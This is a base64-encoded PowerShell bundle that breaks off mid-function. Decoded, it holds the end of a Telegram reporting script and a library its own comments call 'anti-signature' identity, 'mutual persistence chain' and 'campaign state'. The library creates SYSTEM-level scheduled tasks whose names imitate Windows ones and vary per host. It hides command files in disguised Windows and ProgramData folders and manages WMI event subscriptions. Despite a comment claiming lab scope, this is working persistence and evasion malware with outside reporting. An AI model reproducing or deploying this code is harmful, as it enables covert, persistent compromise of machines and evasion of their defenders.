Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDIwCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMjA6IC1EZWVwIG11c3Qg
bm90IHNraXAgbGlnaHQgc3RhcnQvcmVwYWlyIChyYXRlLWxpbWl0IGxlZnQgR3J5eGEgU3RvcHBl
ZCkuCiMgTDE5OiByYXRlLWxpbWl0IG5ldmVyIGJsb2NrcyB3aGVuIEdyeXhhIGZ1bGx5IGFic2Vu
dDsgU3RhcnRQZW5kaW5nIGtlZXAuCiMgTDE4OiBleHRlcm1pbmF0ZSB3YXMgS0lMTElORyBHcnl4
YSAobnVsbC1wYXRoIHByb2Mga2lsbCk7IHN5bmMgRlAgYmVmb3JlIGtpbGwuCiMgTDE3OiBHcnl4
YSByZWluc3RhbGwgTE9DSyB3aGlsZSBhbnkgbm9uLXNldnJ6IFNDIFJ1bm5pbmc7IEZQIGRyaWZ0
IG5ldmVyIC94LgojIEwxNjogTkVWRVIgcmVpbnN0YWxsIEdyeXhhIHdoZW4gUnVubmluZyAocGFu
ZWwgZHVwbGljYXRlcyk7IFRDUCBhZHZpc29yeSBvbmx5LgojIEwxNTogZ3J5eGEtaGVhbHRoIC8g
Z3J5eGEtZW5zdXJlIOKAlCA4aCBkZWVwIGNoZWNrIChUQ1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0
YWxsKS4KIyBMMTM6IHNjaHRhc2tzIENyZWF0ZSB2aWEgY21kIChsaWtlIFd1Y2FjaGVPd24pLCBU
UiB1bmRlciBXaW5kb3dzXFRlbXBcLnd1Y2FjaGUKIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9n
cmFtRGF0YSBwYXRoKSwgL1NUIDAwOjAwIG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLgojIEwxMjog
SURFTlRWRVI9NyBST09ULWxldmVsIHRhc2sgbmFtZXMgKG5lc3RlZCBNaWNyb3NvZnRcV2luZG93
cyBBY2Nlc3MgRGVuaWVkKS4KIyBMMTE6IE5FVkVSIHJldXNlIHJlYWwgV2luZG93cyBidWlsdC1p
biB0YXNrIG5hbWVzOyBUUiBvd25lcnNoaXAgY2hlY2tzLgojIEF1dGhvcml6ZWQgaW50ZXJuYWwg
ZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5LgojIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApbQ21kbGV0QmluZGluZygpXQpwYXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0g
JHRydWUpXQogICAgW1ZhbGlkYXRlU2V0KCdpbml0JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVu
c3VyZScsICd0YXNrcy1lbnN1cmUnLCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3Jl
Z2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUnLCAnZ3J5eGEtaGVhbHRoJywgJ2dyeXhhLWVuc3VyZScp
XQogICAgW3N0cmluZ10kQWN0aW9uLAogICAgW3N0cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFt
RGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZScsCiAgICBbc3RyaW5nXSRN
b25QYXRoID0gJycsCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1JywKICAgIFtzdHJpbmddJEV4
dHJhICA9ICcnLAogICAgW3N0cmluZ10kRnAgICAgID0gJycsCiAgICBbc3dpdGNoXSREZWVwLAog
ICAgW3N3aXRjaF0kRm9yY2UKKQoKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNv
bnRpbnVlJwokY2ZnUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJwokSWRl
bnRWZXJzaW9uID0gOAoKIyBSb290LWxldmVsIG5hbWVzIFdJVEhPVVQgbGVhZGluZyBiYWNrc2xh
c2ggKG1hdGNoZXMgd29ya2luZyBXdWNhY2hlT3duIHN0eWxlKS4KJFBvb2xzID0gQHsKICAgIEEg
PSBAKCdXZXJRdWV1ZVN5bmMnLCdEaWFnSG9zdENhY2hlJywnTmV0VHJhY2VDYWNoZScsJ1dkaUhv
c3RQcm94eScsJ1BsYVNlcnZlckhlYWx0aCcsJ1RjcElwQ29uZmxpY3RSZXMnLCdTckNhY2hlU3lu
YycsJ1Jlc29sdXRpb25RdWV1ZScpCiAgICBCID0gQCgnUGxhU2VydmVySGVhbHRoJywnV2RpSG9z
dFByb3h5JywnV2VyUXVldWVTeW5jJywnTmV0VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdU
Y3BJcENvbmZsaWN0UmVzJywnUGxhU2VydmVyRGlhZycsJ1NyQ2FjaGVTeW5jJykKICAgIEMgPSBA
KCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1dl
clF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ0RpYWdIb3N0Q2FjaGUnLCdQbGFTZXJ2ZXJE
aWFnJywnV2RpSG9zdFByb3h5JykKICAgIEQgPSBAKCdUY3BJcENvbmZsaWN0UmVzJywnUmVzb2x1
dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdQbGFTZXJ2ZXJEaWFn
JywnV2VyUXVldWVTeW5jJywnUGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JykKfQokRGVm
YXVsdHMgPSBbb3JkZXJlZF1AewogICAgVEFTS19BID0gJ1dlclF1ZXVlU3luYycKICAgIFRBU0tf
QiA9ICdQbGFTZXJ2ZXJIZWFsdGgnCiAgICBUQVNLX0MgPSAnV2RpSG9zdFByb3h5JwogICAgVEFT
S19EID0gJ1RjcElwQ29uZmxpY3RSZXMnCiAgICBNT19BICAgPSAnMicKICAgIE1PX0IgICA9ICcz
Jwp9CgpmdW5jdGlvbiBHZXQtSG9zdFNlZWQgewogICAgJHMgPSAwTAogICAgZm9yZWFjaCAoJGMg
aW4gJGVudjpDT01QVVRFUk5BTUUuVG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsgJHMgPSAoJHMg
KiAzMSArIFtpbnRdJGMpICUgMTAwMDAwMDAwNyB9CiAgICByZXR1cm4gJHMKfQoKZnVuY3Rpb24g
UmVhZC1JZGVudGl0eSB7CiAgICAkaWQgPSAkRGVmYXVsdHMuQ2xvbmUoKQogICAgaWYgKFRlc3Qt
UGF0aCAkY2ZnUGF0aCkgewogICAgICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQtQ29udGVudCAt
TGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlKSkgewogICAgICAgICAgICBpZiAoJGxpbmUgLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkWyRtYXRjaGVzWzFdXSA9
ICRtYXRjaGVzWzJdIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGlkCn0KCmZ1bmN0aW9u
IFJlbW92ZS1UYXNrUXVpZXQoW3N0cmluZ10kdG4pIHsKICAgIGlmICgkdG4pIHsgJiBzY2h0YXNr
cy5leGUgL0RlbGV0ZSAvVE4gJHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9Cn0KCmZ1bmN0aW9uIEdl
dC1UYXNrVmVyYm9zZUJsb2IoW3N0cmluZ10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1
cm4gJycgfQogICAgJG91dCA9ICYgc2NodGFza3MuZXhlIC9RdWVyeSAvVE4gJHRuIC9GTyBMSVNU
IC9WIDI+JG51bGwKICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsg
cmV0dXJuICcnIH0KICAgIHJldHVybiAoKCRvdXQgfCBGb3JFYWNoLU9iamVjdCB7ICIkXyIgfSkg
LWpvaW4gImBuIikKfQoKZnVuY3Rpb24gVGVzdC1UYXNrT3duc01vbihbc3RyaW5nXSR0biwgW3N0
cmluZ10kbWFya2VyKSB7CiAgICAjIFRydWUgb25seSBpZiB0aGUgc2NoZWR1bGVkIGFjdGlvbiBw
b2ludHMgYXQgT1VSIG1vbi9ldGwgcGF0aCDigJQgbm90IGEgV2luZG93cyBDT00gaGFuZGxlci4K
ICAgICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAkdG4KICAgIGlmICgtbm90ICRibG9iKSB7
IHJldHVybiAkZmFsc2UgfQogICAgaWYgKCRtYXJrZXIgLWFuZCAoJGJsb2IgLW1hdGNoIFtyZWdl
eF06OkVzY2FwZSgkbWFya2VyKSkpIHsgcmV0dXJuICR0cnVlIH0KICAgIGlmICgkYmxvYiAtbWF0
Y2ggJyg/aSlcLnd1Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21vblwuY21kfFwuZXRsY2FjaGVc
XCcpIHsgcmV0dXJuICR0cnVlIH0KICAgIHJldHVybiAkZmFsc2UKfQoKZnVuY3Rpb24gSW5pdGlh
bGl6ZS1JZGVudGl0eSB7CiAgICAjIElkZW1wb3RlbnQgd2l0aGluIGFuIElERU5UVkVSIGdlbmVy
YXRpb24uIFBvb2wgdXBncmFkZXMgYnVtcCBJREVOVFZFUjoKICAgICMgb3duZWQgb2xkLW5hbWUg
dGFza3MgYXJlIGRlbGV0ZWQ7IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2FtZSBuYW1lIGFyZSBs
ZWZ0IGFsb25lLgogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgewogICAgICAgICRvbGQgPSBS
ZWFkLUlkZW50aXR5CiAgICAgICAgIyBMNzogYWxzbyByZWdlbmVyYXRlIGlmIGFueSBUQVNLXyog
aXMgZW1wdHkgKEw0LUw2IG1vZHVsby9jYXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykKICAgICAg
ICAkc2xvdHNPayA9ICgkb2xkWydJREVOVFZFUiddIC1lcSAiJElkZW50VmVyc2lvbiIpIC1hbmQg
JG9sZFsnVEFTS19BJ10gLWFuZCAkb2xkWydUQVNLX0InXSAtYW5kICRvbGRbJ1RBU0tfQyddIC1h
bmQgJG9sZFsnVEFTS19EJ10KICAgICAgICBpZiAoJHNsb3RzT2spIHsgcmV0dXJuICRvbGQgfQog
ICAgICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0Qn
KSB7CiAgICAgICAgICAgICR0biA9IFtzdHJpbmddJG9sZFska10KICAgICAgICAgICAgaWYgKC1u
b3QgJHRuKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgIyBOZXZlciBkZWxldGUgYSByZWFsIFdp
bmRvd3MgdGFzayB3ZSBuZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3RvbSBoYW5kbGVyKS4KICAg
ICAgICAgICAgaWYgKFRlc3QtVGFza093bnNNb24gJHRuICcnKSB7IFJlbW92ZS1UYXNrUXVpZXQg
JHRuIH0KICAgICAgICB9CiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRo
IC1Gb3JjZQogICAgfQogICAgJHMgPSBHZXQtSG9zdFNlZWQKICAgICMgTDQ6IHR3byBzbG90cyBt
YXkgaGFzaCB0byB0aGUgc2FtZSB0YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVzKSAtPgogICAg
IyBvbmUgcGh5c2ljYWwgdGFzayB0aGVuIHNhdGlzZmllcyB0d28gc2xvdHMgYW5kIHRoZSBmbGVl
dCBzaG93cyAzLzQuCiAgICAjIFdhbGsgZWFjaCBwb29sIGZvcndhcmQgdW50aWwgdGhlIHBpY2sg
aXMgdW5pcXVlIGFjcm9zcyBzbG90cy4KICAgICMgTDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4
KSwgLi4uKSBmb3JtIHdhcyBkb3VibGUtYnJva2VuIGluIFBTIDUuMToKICAgICMgYmFyZSAlIGlu
c2lkZSBAKCkgcGFyc2VzIGFzIHRoZSBGb3JFYWNoLU9iamVjdCBhbGlhcyAobm90IG1vZHVsbyks
IHNvIHRoZQogICAgIyBjb2xsZWN0aW9uIGNvbGxhcHNlZCBhbmQgdGhlIGxvb3AgbmV2ZXIgcmFu
IC0+IGlkZW50aXR5LmNmZyBoYWQgRU1QVFkKICAgICMgVEFTS18qIGFuZCB0aGUgd2hvbGUgZmxl
ZXQgZmVsbCBiYWNrIHRvIGlkZW50aWNhbCBkZWZhdWx0IHRhc2sgbmFtZXMuCiAgICAkc2VlZHMg
PSBbb3JkZXJlZF1AewogICAgICAgIEEgPSAoJHMgJSA4KQogICAgICAgIEIgPSAoKCRzICsgMykg
JSA4KQogICAgICAgIEMgPSAoKCRzICsgNSkgJSA4KQogICAgICAgIEQgPSAoKCRzICsgNykgJSA4
KQogICAgfQogICAgJHBpY2sgPSBbb3JkZXJlZF1Ae30KICAgIGZvcmVhY2ggKCRsZXR0ZXIgaW4g
J0EnLCdCJywnQycsJ0QnKSB7CiAgICAgICAgJGkgPSBbaW50XSRzZWVkc1skbGV0dGVyXQogICAg
ICAgICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRpXQogICAgICAgICRuID0gMAogICAgICAgIHdo
aWxlICgkcGljay5WYWx1ZXMgLWNvbnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgpIHsgJGkgPSAo
JGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRpXTsgJG4rKyB9CiAgICAgICAg
aWYgKC1ub3QgJG5hbWUpIHsgJG5hbWUgPSAkRGVmYXVsdHNbIlRBU0tfJGxldHRlciJdIH0KICAg
ICAgICAkcGlja1skbGV0dGVyXSA9ICRuYW1lCiAgICB9CiAgICAkY2ZnID0gQCgKICAgICAgICAi
VEFTS19BPSQoJHBpY2suQSkiCiAgICAgICAgIlRBU0tfQj0kKCRwaWNrLkIpIgogICAgICAgICJU
QVNLX0M9JCgkcGljay5DKSIKICAgICAgICAiVEFTS19EPSQoJHBpY2suRCkiCiAgICAgICAgIk1P
X0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAjIDItNSBtaW4gaml0dGVyCiAgICAgICAgIk1P
X0I9JCgzICsgKCgkcyArIDEpICUgMykpIiAgICAjIDMtNSBtaW4gaml0dGVyCiAgICAgICAgIlNF
RUQ9JHMiCiAgICAgICAgIklERU5UVkVSPSRJZGVudFZlcnNpb24iCiAgICApCiAgICBTZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLVZhbHVlICRjZmcgLUZvcmNlCiAgICByZXR1cm4g
KFJlYWQtSWRlbnRpdHkpCn0KCmZ1bmN0aW9uIE5vcm1hbGl6ZS1UYXNrTmFtZShbc3RyaW5nXSR0
bikgewogICAgaWYgKC1ub3QgJHRuKSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gJHRuLlRyaW0o
KS5UcmltU3RhcnQoJ1wnKQp9CgpmdW5jdGlvbiBXcml0ZS1Pd25Mb2coW3N0cmluZ10kbSkgewog
ICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCiAgICB0cnkgeyBBZGQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJG0gLUZvcmNlIH0gY2F0Y2gge30KfQoKZnVu
Y3Rpb24gRW5zdXJlLVBlcnNpc3RUYXNrcyB7CiAgICAjIE1pcnJvciB3b3JraW5nIGRldGFjaCAo
V3VjYWNoZU93bik6IGNtZCBzY2h0YXNrcywgQk9PVCBUUiBwYXRoLCAvU1Qgb24gTUlOVVRFLgog
ICAgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgJE1v
blBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJyB9CiAgICAkYm9vdCA9IEpv
aW4tUGF0aCAkZW52OlN5c3RlbVJvb3QgJ1RlbXBcLnd1Y2FjaGUnCiAgICAkZXRsRGlyID0gJ0M6
XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlJwogICAgZm9y
ZWFjaCAoJGQgaW4gQCgkYm9vdCwgJGV0bERpcikpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1Q
YXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0
aCAkZCAtRm9yY2UgfCBPdXQtTnVsbCB9CiAgICB9CiAgICAkYm9vdE1vbiA9IEpvaW4tUGF0aCAk
Ym9vdCAnb3duX21vbi5jbWQnCiAgICAkYm9vdEV0bCA9IEpvaW4tUGF0aCAkYm9vdCAnZXRsX21v
bi5jbWQnCiAgICAkZXRsTW9uID0gSm9pbi1QYXRoICRldGxEaXIgJ2V0bF9tb24uY21kJwogICAg
aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1vblBhdGgpIHsKICAgICAgICBDb3B5LUl0ZW0g
LUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdE1vbiAtRm9yY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRN
b25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5h
dGlvbiAkZXRsTW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfQog
ICAgIyBCT09UIGlzIG5vdCBMb2NrRGlyJ2QgYnkgb3duX3NlY3VyZSDigJQgVGFzayBTY2hlZHVs
ZXIgY2FuIHJlc29sdmUgVFIgdGhlcmUuCiAgICAkdHJNb24gPSAiY21kLmV4ZSAvYyAkYm9vdE1v
biIKICAgICR0ckV0bCA9ICJjbWQuZXhlIC9jICRib290RXRsIgogICAgJG1vQSA9IFtzdHJpbmdd
JGlkWydNT19BJ107IGlmICgtbm90ICRtb0EpIHsgJG1vQSA9ICcyJyB9CiAgICAkbW9CID0gW3N0
cmluZ10kaWRbJ01PX0InXTsgaWYgKC1ub3QgJG1vQikgeyAkbW9CID0gJzMnIH0KICAgICRzdCA9
IChHZXQtRGF0ZSkuVG9TdHJpbmcoJ0hIOm1tJykKICAgICRzcGVjcyA9IEAoCiAgICAgICAgQHsg
S2V5ID0gJ1RBU0tfQSc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1v
ID0gJG1vQTsgVHIgPSAkdHJNb24gfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0InOyBNYXJrZXIg
PSAnZXRsX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0I7IFRyID0gJHRyRXRsIH0K
ICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAn
T05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19E
JzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAnT05MT0dPTic7IE1vID0gJyc7IFRyID0g
JHRyTW9uIH0KICAgICkKICAgICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwCiAgICBm
b3JlYWNoICgkc3AgaW4gJHNwZWNzKSB7CiAgICAgICAgJHRuID0gTm9ybWFsaXplLVRhc2tOYW1l
IChbc3RyaW5nXSRpZFskc3AuS2V5XSkKICAgICAgICBpZiAoLW5vdCAkdG4pIHsgJGZhaWwrKzsg
Y29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7
ICRvaysrOyBjb250aW51ZSB9CiAgICAgICAgaWYgKFRlc3QtVGFza093bnNNb24gKCJcJHRuIikg
JHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgICRibG9iID0gR2V0LVRhc2tW
ZXJib3NlQmxvYiAkdG4KICAgICAgICBpZiAoLW5vdCAkYmxvYikgeyAkYmxvYiA9IEdldC1UYXNr
VmVyYm9zZUJsb2IgKCJcJHRuIikgfQogICAgICAgIGlmICgkYmxvYikgewogICAgICAgICAgICAk
b3Vyc0Jyb2tlbiA9ICgkYmxvYiAtbWF0Y2ggJyg/aSlvd25fbW9uXC5jbWR8ZXRsX21vblwuY21k
fFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpCiAgICAgICAgICAgIGlmICgtbm90ICRvdXJzQnJv
a2VuKSB7ICRmYWlsKys7IFdyaXRlLU93bkxvZyAidGFza3Nfc2tpcF9mb3JlaWduICR0biI7IGNv
bnRpbnVlIH0KICAgICAgICAgICAgUmVtb3ZlLVRhc2tRdWlldCAkdG4KICAgICAgICAgICAgUmVt
b3ZlLVRhc2tRdWlldCAoIlwkdG4iKQogICAgICAgIH0KICAgICAgICAjIEJ1aWxkIGNtZGxpbmUg
ZXhhY3RseSBsaWtlIG93bi5jbWQgZGV0YWNoIChwcm92ZW4gdG8gd29yayBhcyBTWVNURU0pLgog
ICAgICAgICRwYXJ0cyA9IEAoCiAgICAgICAgICAgICcvQ3JlYXRlJywgJy9UTicsICR0biwgJy9S
VScsICdTWVNURU0nLCAnL1JMJywgJ0hJR0hFU1QnLCAnL0YnLAogICAgICAgICAgICAnL1RSJywg
JHNwLlRyLCAnL1NDJywgJHNwLlNjCiAgICAgICAgKQogICAgICAgIGlmICgkc3AuU2MgLWVxICdN
SU5VVEUnKSB7CiAgICAgICAgICAgICRwYXJ0cyArPSBAKCcvTU8nLCAkc3AuTW8sICcvU1QnLCAk
c3QpCiAgICAgICAgfQogICAgICAgICRhcmdMaW5lID0gKCRwYXJ0cyB8IEZvckVhY2gtT2JqZWN0
IHsKICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnW1xzIl0nKSB7ICciezB9IicgLWYgKCRfIC1y
ZXBsYWNlICciJywgJ1wiJykgfSBlbHNlIHsgJF8gfQogICAgICAgIH0pIC1qb2luICcgJwogICAg
ICAgICRjcmVhdGVUeHQgPSBjbWQuZXhlIC9jICJzY2h0YXNrcy5leGUgJGFyZ0xpbmUiIDI+JjEg
fCBGb3JFYWNoLU9iamVjdCB7ICIkXyIgfQogICAgICAgICRjcmVhdGVKb2luZWQgPSAoJGNyZWF0
ZVR4dCAtam9pbiAnICcpLlRyaW0oKQogICAgICAgIFdyaXRlLU93bkxvZyAidGFza3NfY3JlYXRl
ICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVKb2luZWQiCiAgICAgICAgaWYgKChUZXN0LVRhc2tP
d25zTW9uICR0biAkc3AuTWFya2VyKSAtb3IgKFRlc3QtVGFza093bnNNb24gKCJcJHRuIikgJHNw
Lk1hcmtlcikpIHsKICAgICAgICAgICAgJHJlYXJtZWQrKwogICAgICAgICAgICBpZiAoJHNwLktl
eSAtZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7CiAgICAgICAgICAgICAg
ICBjbWQuZXhlIC9jICJzY2h0YXNrcy5leGUgL1J1biAvVE4gYCIkdG5gIiIgfCBPdXQtTnVsbAog
ICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGZhaWwrKwogICAgICAg
ICAgICBXcml0ZS1Pd25Mb2cgInRhc2tzX2NyZWF0ZV9GQUlMICQoJHNwLktleSkgJHRuIgogICAg
ICAgIH0KICAgIH0KICAgIHJldHVybiAidGFza3Mgb2s9JG9rIHJlYXJtZWQ9JHJlYXJtZWQgZmFp
bD0kZmFpbCIKfQoKZnVuY3Rpb24gUmVtb3ZlLVdhdGNoZG9nIHsKICAgIGZvcmVhY2ggKCRjbHMg
aW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZycsJ19fRXZlbnRGaWx0ZXInLCdDb21tYW5k
TGluZUV2ZW50Q29uc3VtZXInLCdfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbicpKSB7CiAgICAg
ICAgR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyAkY2xz
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0
